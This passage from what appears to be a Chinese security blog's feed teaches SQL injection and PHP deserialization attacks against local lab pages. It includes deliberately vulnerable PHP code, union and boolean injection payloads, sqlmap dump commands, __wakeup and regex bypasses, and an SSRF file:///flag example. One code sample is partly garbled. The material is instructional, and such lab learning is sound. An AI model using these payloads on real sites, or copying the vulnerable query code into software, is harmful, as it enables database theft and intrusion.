good where id&#x3D;&quot;.$id);</span><br><span class="line">$result&#x3D; $data-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line">echo $result[&#39;username&#39;];</span><br><span class="line">echo $result[&#39;password&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/good%E8%A1%A8.png" alt="good表"></p><h4 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过在url中修改对应的id值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号），反斜杠\来探测url中是否存在注入点。</span><br><span class="line"></span><br><span class="line">1，加入单引号‘ 提交</span><br><span class="line">结果：如果出现错误提示，则该网站可能存在注入漏洞</span><br><span class="line"></span><br><span class="line">2 加入字段提交</span><br><span class="line">语句：and 1&#x3D;1；and 1&#x3D;2；</span><br><span class="line">结果：分别返回不同的页面，说明存在注入漏洞</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/id=1.png" alt="?id=1"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/id=1%E2%80%99.png" alt="?id=1&#39;"></p><p>由此可知，我们编写的数据库存在sql注入漏洞。</p><h4 id="order-by-判断字段数量"><a href="#order-by-判断字段数量" class="headerlink" title="order by 判断字段数量"></a>order by 判断字段数量</h4><p>我们已经得到该网站可能存在SQL注入漏洞的结论，接着使用order by 1-99语句查询该数据表的字段数量。如访问id=1 order by 3，页面返回与id=1相同的结果，访问id=4,页面返回与id不同的结果，则字符段为3.</p><p>我们还可以使用order by 1,2,3，order by 1,2,3,4 返回不同的页面，则字符断为3.</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/order%20by%201%EF%BC%8C2%EF%BC%8C3.png" alt="order by 1,2,3"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/order%20by%201,2,3,4.png" alt="order by 1,2,3,4"></p><h4 id="联合查询判断注入点"><a href="#联合查询判断注入点" class="headerlink" title="联合查询判断注入点"></a>联合查询判断注入点</h4><p>我们已经知道一共有三个字段，当id=1时，能够成功执行，则不会返回union select的语句，当id=-1时，服务器会返回union select的结果，可以看到，我们可以查询第二个字段和第三个字段。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union.png" alt="union"></p><p><strong>union查询也可以获得当前数据库</strong></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union7.png" alt="union7"></p><p><strong>获得当前数据库的第一个表名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+password+from+xiaoming.good+where+id&#x3D;1),3</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union8.png"></p><p><strong>获取表名当中的字段名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+column_name+from+information_schema.colimns+where+table_schema&#x3D;&#39;xiaoming&#39;+and+tablename&#x3D;&#39;good&#39;+limit+1,1),3</span><br></pre></td></tr></table></figure><p><strong>查询第一个字段</strong></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union9.png" alt="union9"></p><p><strong>查询第二个字段</strong></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union10.png" alt="union10"></p><h3 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;xiaoming&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;good&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">if(preg_match(&quot;</span>/union|sleep|benchmark/i<span class="string">&quot;,<span class="subst">$id</span>))</span></span><br><span class="line"><span class="string">&#123;exit(&quot;</span>no<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> <span class="subst">$data</span> = <span class="subst">$conn</span>-&gt;query(&quot;</span>select * <span class="keyword">from</span> good where id=<span class="string">&quot;.<span class="subst">$id</span>);</span></span><br><span class="line"><span class="string">  <span class="subst">$row</span>= <span class="subst">$data</span>-&gt;fetch_array(MYSQL_ASSOC);</span></span><br><span class="line"><span class="string"> if(<span class="subst">$row</span>)&#123;</span></span><br><span class="line"><span class="string"> exit(&quot;</span>yes<span class="string">&quot;);</span></span><br><span class="line"><span class="string"> &#125;else&#123;</span></span><br><span class="line"><span class="string"> exit(&quot;</span>no<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码可知，页面只返回yes和no，而没有返回数据库里面的数据，所有不能使用union注入。</p><p>可以尝试Boolean注入。Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的。</p><p>访问id=1 and 1=2 返回no，访问id=1 and 1=1 返回yes，由此可以判断，可以尝试利用Boolean注入构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的。</p><h4 id="查询判断数据库的长度"><a href="#查询判断数据库的长度" class="headerlink" title="查询判断数据库的长度"></a><strong>查询判断数据库的长度</strong></h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean2.png" alt="boolean2"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean3.png" alt="boolean3"></p><p>可知，数据库的长度为8。</p><h4 id="利用substr判断数据库的库名"><a href="#利用substr判断数据库的库名" class="headerlink" title="利用substr判断数据库的库名"></a><strong>利用substr判断数据库的库名</strong></h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean4.png" alt="boolean4"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean6.png" alt="boolean6"></p><p>我们可以利用Burp爆破数据库中的库名，同理，我们也可以利用burp爆破数据库中的表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ord(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;xiaoming&#39; limit 0,1),1,1))&#x3D;105</span><br></pre></td></tr></table></figure><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞。</p><h3 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-db database</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–tables  -T 指定表名 </span><br><span class="line"> -D 列出指定数据库的表</span><br><span class="line">--columns 获取列</span><br><span class="line">--count 获取有几行数据 </span><br><span class="line">-C 读取数据（例如-C “username,password”）</span><br><span class="line">--dump 导出数据</span><br><span class="line">--level5：探测等级</span><br><span class="line">--roles：列出数据库管理员角色</span><br><span class="line">-sql-shell:运行自定义SQL语句</span><br><span class="line">-file-read:从数据库服务器中读取文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--referer:HTTP Referer头  (-r REQUESTFILE 从一个文件中载入HTTP请求。)</span><br><span class="line">SQL可以在请求中伪造HTTP的referer，当--level参数设定为3或者3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如--referer http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可注入的参数</span><br><span class="line">–proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">–data</span><br><span class="line">data后面的数据是以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数</span><br><span class="line">sqlmap -u “http:&#x2F;&#x2F;192.168.120.249&#x2F;baji&#x2F;login.php” --data&#x3D;“username&#x3D;111111&amp;password&#x3D;111111”</span><br></pre></td></tr></table></figure><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><strong>利用下列代码进行演示</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$data = $conn-&gt;query(<span class="string">&quot;select * from good where id=&quot;</span>.$id);</span><br><span class="line">$result= $data-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap1.png" alt="sqlmap1"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap2.png" alt="sqlmap2"></p><p>当注入点后面的参数大于等于两个时，需要加双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1&amp;uid&#x3D;2</span><br></pre></td></tr></table></figure><h4 id="判断文本当中的请求是否存在注入"><a href="#判断文本当中的请求是否存在注入" class="headerlink" title="判断文本当中的请求是否存在注入"></a>判断文本当中的请求是否存在注入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /sql1.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: bilibili Security Browser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>将该HTTP请求保存为1.txt</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap3.png" alt="sqlmap3"></p><h4 id="查询当前用户下的所有数据库"><a href="#查询当前用户下的所有数据库" class="headerlink" title="查询当前用户下的所有数据库"></a>查询当前用户下的所有数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure><h4 id="查询当前所在的数据库"><a href="#查询当前所在的数据库" class="headerlink" title="查询当前所在的数据库"></a>查询当前所在的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9A%B4%E5%BA%93.png" alt="暴库"></p><h4 id="使用sqlmap查询当前数据库中的表名"><a href="#使用sqlmap查询当前数据库中的表名" class="headerlink" title="使用sqlmap查询当前数据库中的表名"></a>使用sqlmap查询当前数据库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 当前数据库名 --tables </span><br></pre></td></tr></table></figure><h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure><h4 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 -C 字段名，字段名 --dump</span><br></pre></td></tr></table></figure><p><strong>为方便理解，在代码中加了换行。</strong></p><p>发现只有当查询语句只返回一个字符串（值）才有正常的回显。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union6.png" alt="union6"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+table_name+from+information_schema.tables+where+table_schema&#x3D;&#39;xiaoming&#39;+limit+0,1),3</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union8.png" alt="union8"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入漏洞的产生需要满足的条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="http://www.yoyo2tong.xyz/2020/10/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.yoyo2tong.xyz/2020/10/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-09T09:58:04.685Z</published>
    <updated>2021-03-21T08:28:26.198Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>把对象转换为字节序列的过程称为对象的序列化<strong>；</strong>把字节序列恢复为对象的过程称为对象的反序列化。</p><p>对象的序列化主要有两种用途：</p><p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p><p>2） 在网络上传送对象的字节序列。</p><p>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode</p><h4 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h4><p>unserialize函数，json_decode函数变量可控，php文件中存在可利用的类，类中有魔术方法</p><p>php将所有以 __ (两个下划线) 开头的类方法保留为魔术方法</p><p>常用的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct()  当一个对象创建时自动调用</span><br><span class="line">__wakeup()     使用unserialse()函数时会自动调用</span><br><span class="line">__destruct()   当对象被销毁时自动调用（php绝大多数情况下会自动调用销毁对象）</span><br><span class="line">__sleep()      使用serialize()函数是触发</span><br><span class="line">__toString()  把类当作字符串使用时触发，返回值需要为字符串</span><br><span class="line">    (例如一个类A,实例化之后为$a,<span class="keyword">echo</span> $a, 或者$a与字符串对比，这时就会触发该函数)</span><br></pre></td></tr></table></figure><h4 id="不同属性序列化"><a href="#不同属性序列化" class="headerlink" title="不同属性序列化"></a>不同属性序列化</h4><p>Public属性序列化后格式:成员名</p><p>Private属性序列化后格式:%00类名%00成员名</p><p>Protected属性序列化后的格式:%00*%00成员名</p><p>new类名()：调用这个类的构造函数初始化对象，类名（）这个是构造函数，用来初始化。</p><p>在进行类的序列化时 私有属性 会加空白字符类名空白字符；保护属性会加 * （注意空白字符不是空格，空格的16进制为20，空白字符的16进制为00）</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png"></p><h4 id="在类外定义类中的值"><a href="#在类外定义类中的值" class="headerlink" title="在类外定义类中的值"></a>在类外定义类中的值</h4><p>重新定义类中属性的值</p><p>通过new 类名 （”对类中的变量重新定义“）</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png"></p><p>在类的外面定义类中的函数并调用方法</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png"></p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 使用unserialse（）函数时会自动调用</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行</span><br><span class="line"></span><br><span class="line">CVE-2016-7124(绕过__wakeup)</span><br><span class="line">漏洞影响版本：</span><br><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure><h3 id="OC绕过"><a href="#OC绕过" class="headerlink" title="OC绕过"></a>OC绕过</h3><p>OC绕过是通过修改O：数字（C：数字）来绕过正则匹配</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/&#x27;</span>,$var))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//若传入的参数有匹配了这个正则，则输入错误。</span></span><br><span class="line">我们可以使用+号当做空格绕过，即O:+<span class="number">4</span>即可绕过。</span><br></pre></td></tr></table></figure><h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p>私有属性产生的一些不可见字符如果被过滤掉，可以用字符编码来替换这些字符进行绕过。</p><p>例：当反序列化中的属性是private时，在url输入payload时空字符不能被识别，会导致反序列化失败，我们可以在把空字符转换为16进制绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\00就是16进制的chr（0）</span><br><span class="line">%00是chr(0)的url编码</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png"></p><p>可以看出，当属性为private时，例：private $address = ‘shanxi’,反序列化的时候应为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00test\00address</span><br></pre></td></tr></table></figure><p>当属性为protected时，例：protected $age = ‘21’,反序列化的时候应该为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00*\00age</span><br></pre></td></tr></table></figure><p>当代码过滤一些字符的时候<code>例如：flag</code>，我们可以通过16进制编码把flag编写为16进制，这时我们可以把表示字符串的字符s改为大写，这样它在反序列化的时候就能识别16进制，既可以绕过过滤，又可以成功执行反序列化。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/5.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png"></p><p>可以看到，当s为大写时，可以成功识别16进制。</p><h4 id="unserialize4"><a href="#unserialize4" class="headerlink" title="unserialize4"></a>unserialize4</h4><p>cURL会话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">初始化一个新的cURL会话并获取一个网页</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">&quot;http://www.runoob.com/&quot;</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//创建cURL就可以使用一些协议读取和执行相关命令</span></span><br><span class="line">   <span class="comment">// http://www.xxx.com/ssrf.php?url=file:///flag</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $b = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);<span class="comment">//strpos()函数查找字符串在另一字符串中第一次出现的位置。如果                                         flag在a中出现过，则$b为真</span></span><br><span class="line">        <span class="keyword">if</span>($b) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();<span class="comment">//初始化一个cURL会话</span></span><br><span class="line">        </span><br><span class="line">        curl_setopt($c, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);<span class="comment">//设定请求的url</span></span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//启用时会将头文件的信息作为数据流输出。 参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//由于一次GET传输会先进行URL解码，这里对字母a进行双url编码</span></span><br></pre></td></tr></table></figure><p><img 